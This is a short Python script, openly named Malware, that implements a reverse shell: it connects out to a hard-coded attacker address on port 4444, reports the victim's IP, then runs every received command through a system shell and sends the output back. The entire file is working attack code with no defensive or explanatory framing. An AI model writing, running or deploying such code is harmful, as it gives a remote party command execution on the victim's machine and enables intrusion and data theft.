import os
import socket
import subprocess

ATTACKER_IP = "192.168.1.251"
ATTACKER_PORT = 4444

class Malware():
    def reverse_shell(self):
        sct = socket.socket()
        sct.connect((ATTACKER_IP, ATTACKER_PORT))
        socket.gethostbyname(socket.gethostname())
        sct.send(
            f"Socket connected to target {socket.gethostbyname(socket.gethostname())}\nType exit to exit\n\n -> revs$ ".encode('utf-8'))
        while True:
            data = sct.recv(1024).decode('utf-8')[:-1]
            if "exit" in data:
                break
            if data[:2] == 'cd' and len(data) > 2:
                if data[-1] != '\\':
                    data += '\\'
                os.chdir(data[3:])
            else:
                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                ret_msg = cmd.stdout.read() + cmd.stderr.read()
                sct.send(ret_msg)
            sct.send(" -> revs$ ".encode('utf-8'))
        sct.close()

if __name__ == "__main__":
    program = Malware()
    program.reverse_shell()
